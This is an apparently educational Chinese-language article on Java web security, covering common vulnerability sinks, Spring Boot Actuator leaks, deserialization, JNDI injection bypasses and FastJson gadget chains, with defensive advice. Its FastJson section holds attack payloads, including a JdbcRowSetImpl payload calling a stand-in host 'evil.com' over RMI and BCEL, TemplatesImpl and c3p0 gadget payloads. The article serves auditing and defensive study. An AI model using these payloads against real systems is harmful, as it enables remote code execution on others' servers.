引言

Java作为企业级应用开发的主流语言，广泛应用于Web系统、微服务、大数据平台等场景。然而，其丰富的生态和复杂的运行机制也带来了众多安全挑战。从基础的SQL注入、XXE，到复杂的反序列化、JNDI注入，攻击者不断挖掘新的攻击面，防御者则需要深入理解漏洞原理和利用技巧。本文将以理论与实践结合的方式，系统梳理Java安全攻防的核心知识点，涵盖常规漏洞、专题漏洞、反序列化、JNDI注入高版本绕过以及FastJson利用链分析，帮助安全从业者构建完整的Java安全知识体系。

---

一、Java常规漏洞攻防

1.1 SQL注入

SQL注入是Java应用中最常见的漏洞之一，其根源在于未对用户输入进行正确过滤或未使用预编译。不同数据库操作框架下的注入点各异：

· JDBC
  · Statement：直接拼接SQL语句，产生注入。
  · PreparedStatement：若采用占位符（?）并预编译，则安全；但若仍使用拼接方式构造SQL，预编译无效。
  · JDBCTemplate：若使用拼接语句，同样存在注入风险。
  · 自定义过滤：黑名单过滤可能被绕过，安全写法应始终使用占位符+预编译。
· MyBatis
  · 参数符号#{}进行预编译，安全；${}直接拼接，存在注入。
  · 常见注入场景：order by、like、in语句。由于#{}会将参数转为字符串导致语法错误，开发者常误用${}，从而引入漏洞。例如：
    ```xml
    <select>select * from user order by ${orderColumn} ${orderType}</select>
    ```
· Hibernate / JPA
  · 使用setParameter或命名参数:username可实现预编译，安全。

白盒审计思路：

1. 确定数据持久层技术（JDBC/MyBatis/Hibernate等）。
2. 找到SQL操作代码，检查参数拼接方式。
3. 确认是否使用了预编译机制，若使用${}或字符串拼接，则可判定为漏洞。

1.2 XXE注入

XML外部实体注入（XXE）发生在XML解析器处理外部实体时。Java中多个XML解析类默认支持外部实体，若未禁用则可能造成文件读取、SSRF等危害。

审计敏感函数（以下类若parse方法参数可控，则存在风险）：

· XMLReader.parse()
· SAXReader.parse()
· DocumentBuilder.parse()
· XMLStreamReader
· SAXBuilder.build()
· SAXParser.parse()
· SAXSource
· TransformerFactory
· SAXTransformerFactory
· SchemaFactory
· Unmarshaller.unmarshal()
· XPathExpression.evaluate()

防御：解析XML前设置setFeature禁用DOCTYPE和外网实体。

1.3 命令执行（RCE）

Java中执行系统命令的常见方式：

· Runtime.getRuntime().exec()
· ProcessBuilder
· ProcessImpl（底层实现）
· GroovyShell（若可注入Groovy表达式）

审计时关注这些函数的参数是否由用户控制，且未经过严格过滤。

1.4 SSRF与URL跳转

· SSRF：java.net.URL类可发起网络请求，若URL的地址由用户控制，攻击者可探测内网或进行端口扫描。
· URL跳转：Spring MVC中通过ModelAndView设置重定向视图，或使用HttpServletResponse.sendRedirect()、ResponseEntity设置Location头。若跳转地址可控，可造成钓鱼或Open Redirect。

1.5 其他漏洞

· XSS：输出到页面的数据未编码。
· CSRF：缺乏Token验证。
· 文件上传/下载：未限制文件类型或路径遍历。
· 业务逻辑漏洞：如越权操作、密码重置缺陷等。

---

二、Java专题漏洞深度剖析

2.1 SSTI模板注入

模板引擎将用户输入作为模板内容解析，若未正确过滤，可执行恶意表达式。
常见Java模板引擎：

· Thymeleaf：使用${...}表达式，若通过@Controller返回模板名称时拼接用户输入，可能导致注入。
· Velocity：#set、$!等指令。
· Freemarker：<#assign>等指令，可调用Java API。

利用参考：模板注入总结

2.2 SPEL表达式注入

Spring Expression Language（SpEL）在运行时解析表达式，常用于配置、权限判断等。若用户可控制表达式内容（如通过@Value或SpelExpressionParser.parseExpression()），则可执行任意代码。

审计点：SpelExpressionParser.parseExpression()的参数是否可控。

2.3 Swagger API接口泄露

Swagger UI用于展示API文档，若未做访问控制，攻击者可查看所有接口定义，进而利用未授权接口。

利用步骤：

1. 发现Swagger UI页面（常见路径：/swagger-ui.html、/v2/api-docs）。
2. 导入到Apifox或Postman，测试敏感接口（如未授权访问、SQL注入等）。
3. 使用扫描器批量探测Swagger端点。

2.4 SpringBoot框架安全

2.4.1 框架识别与扫描

SpringBoot应用通常有默认图标（favicon.ico为绿叶），响应头可能包含X-Application-Context。专用扫描工具：

· SBSCAN
· spring-scan
· SpringBootVul-GUI

2.4.2 Actuator端点泄露

Actuator是SpringBoot的生产监控模块，若未安全配置，可暴露敏感信息。
常见端点：/actuator、/env、/beans、/heapdump、/threaddump、/mappings、/trace等。

Heapdump利用：下载heapdump文件，使用工具提取敏感信息。

· JDumpSpider
· heapdump_tool
· JDumpSpiderGUI

提取内容包括数据库密码、Redis密码、云服务密钥、接口地址等。

2.4.3 其他端点风险

· /druid：Druid监控页未授权，可查看SQL执行、Session等。
· /jolokia：JMX over HTTP，可通过MBean调用执行代码。
· /gateway：Spring Cloud Gateway，可能存在Actuator API泄露或CVE-2022-22947等漏洞。

---

三、Java反序列化漏洞专题

反序列化漏洞源于将不可信数据反序列化为对象时，触发了危险类的构造方法或readObject()，从而导致RCE。

3.1 原生类反序列化

· ObjectInputStream.readObject()：所有实现了Serializable的类都可被反序列化。
· XMLDecoder.readObject()：XML格式的反序列化，可执行任意代码。
· SnakeYaml.load()：解析YAML时可加载恶意类。
· XStream.fromXML()：XStream反序列化XML，历史漏洞频发。

3.2 三方组件反序列化

· Log4j：JNDI注入漏洞（CVE-2021-44228），通过logger.error等记录日志时触发。
· Shiro：CookieRememberMeManager反序列化RememberMe Cookie，利用链可RCE。
    黑盒特征：Cookie中有rememberMe字段。
· Jackson：readValue()反序列化，可配合多态类型开启@type利用。
· FastJson：parse()/parseObject()，经典漏洞版本1.2.24、1.2.47等。
· XStream：fromXML()，历史漏洞如CVE-2021-21345等。

漏洞查询：阿里云漏洞库 avd.aliyun.com

3.3 审计Sink点总结

组件/类 危险方法
JDK原生 ObjectInputStream.readObject()
XMLDecoder readObject()
SnakeYaml Yaml.load()
XStream fromXML()
Jackson readValue()
FastJson parse(), parseObject()
Shiro CookieRememberMeManager（解密后反序列化）
Log4j logger.error, logger.info（JNDI）

利用工具：

· ysoserial
· JYso
· java-chains
· JNDI-Injection-Exploit

---

四、JNDI注入与高版本绕过

JNDI（Java Naming and Directory Interface）允许通过名称查找对象，常被用于RMI、LDAP等。攻击者可构造恶意RMI/LDAP服务器返回Reference对象，引导客户端加载远程恶意类，实现RCE。

4.1 JDK版本限制演进

· 6u45/7u21：java.rmi.server.useCodebaseOnly默认true，禁用远程加载。
· 6u141/7u131/8u121：com.sun.jndi.rmi.object.trustURLCodebase默认false，RMI远程codebase被禁。
· 6u211/7u201/8u191：com.sun.jndi.ldap.object.trustURLCodebase默认false，LDAP远程codebase被禁。

4.2 高版本绕过技术

尽管高版本JDK限制了远程加载，但仍可利用以下方式绕过：

1. 本地Class Factory：通过RMI/LDAP返回Reference指向本地CLASSPATH中的工厂类（如org.apache.naming.factory.BeanFactory），利用其构造恶意对象。
2. 反序列化链：LDAP返回javaSerializedData属性，携带序列化数据，若本地存在Gadget，可触发反序列化漏洞。
3. Tomcat/Spring等中间件类：利用特定类作为Reference工厂，执行恶意逻辑。

分类：

· 针对JDK版本的绕过（如8u191+）
· 针对中间件包的绕过（如Tomcat、WebLogic）
· 针对依赖Jar包的绕过（如利用反序列化链）

4.3 实验案例

以FastJson触发JNDI注入为例：

· 低版本JDK：直接使用RMI/LDAP远程codebase。
· 高版本JDK：需配合本地工厂或反序列化链。工具如JYso可自动选择绕过方式。

相关项目：

· JNDIMap
· JNDIBypass
· java-chains

---

五、FastJson反序列化专项研究

FastJson是国内广泛使用的JSON库，但历史漏洞层出不穷。深入理解其利用链对安全测试至关重要。

5.1 FastJson基础

· 序列化：JSON.toJSONString()
· 反序列化：JSON.parse()、JSON.parseObject()、JSON.parseArray()
· 特性：parseObject默认会调用setter和getter，而parse仅调用setter（若指定@type）。

5.2 版本利用链分析

1.2.24及之前

最经典的JdbcRowSetImpl链，利用JNDI注入：

```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://evil.com:1099/Exploit",
    "autoCommit": true
}
```

1.2.25 - 1.2.47

· 1.2.25引入了autoTypeSupport默认为false，需开启才可使用JNDI链。
· 1.2.47爆出绕过：利用java.lang.Class将恶意类缓存进TypeUtils，后续加载时绕过检查。

1.2.48 - 1.2.80

· 官方持续修复，但仍存在依赖特定包（如TemplatesImpl、BCEL、c3p0）的利用链，且需满足特定条件（如开启Feature.SupportNonPublicField或存在特定依赖）。

5.3 黑盒测试思路

1. 确认FastJson：发送异常JSON，观察报错信息中是否包含fastjson。
2. 探测版本：通过不同payload的响应差异判断（如1.2.24与1.2.47的解析差异）。
3. 发送JNDI探测payload：
   ```json
   {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/test","autoCommit":true}
   ```
   若应用存在延迟，说明可能执行了JNDI查询。
4. 根据版本选择合适的利用链。

5.4 不出网利用技巧

当目标无法出网时，可利用以下链：

· BCEL链（Tomcat/Spring环境）：
  ```json
  {
      "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
      "driverClassLoader": {
          "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
      },
      "driverClassName": "$$BCEL$$$l$8b$I..."
  }
  ```
  利用BCEL字节码加载执行。
· TemplatesImpl链（需SupportNonPublicField）：
  ```json
  {
      "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
      "_bytecodes": ["base64编码字节码"],
      "_name": "a.b",
      "_tfactory": {},
      "_outputProperties": {}
  }
  ```
· c3p0链（需c3p0依赖）：
  ```json
  {
      "@type": "java.lang.Class",
      "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
  },
  {
      "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
      "userOverridesAsString": "HexAsciiSerializedMap:;HEX值"
  }
  ```

参考文章：

· FastJson各版本利用链分析
· FastJson不出网利用

---

六、总结与防御建议

Java安全攻防涉及的知识面广泛，从基础漏洞到高级利用，都需要深入理解底层原理。作为防御方，应做到：

1. 代码审计：关注本文总结的Sink点，确保所有输入均经过严格验证，使用预编译、禁用危险功能。
2. 依赖管理：及时升级存在漏洞的三方库，使用工具扫描已知漏洞。
3. 运行时防护：配置JVM参数禁用JNDI远程加载（如-Dcom.sun.jndi.rmi.object.trustURLCodebase=false），开启RASP（运行时应用自我保护）拦截攻击。
4. 安全测试：利用文中提供的靶场（JavaSec、JavaSecLab、Hello-Java-Sec）进行实战演练，提升攻防能力。

Java安全的攻防博弈永无止境，只有持续学习新技术、复现新漏洞，才能在攻防对抗中立于不败之地。希望本文能为你的Java安全之路提供一份实用的指南。

---

参考资料：

· 文中所有链接及靶场
· 阿里云漏洞库
· 各漏洞分析文章
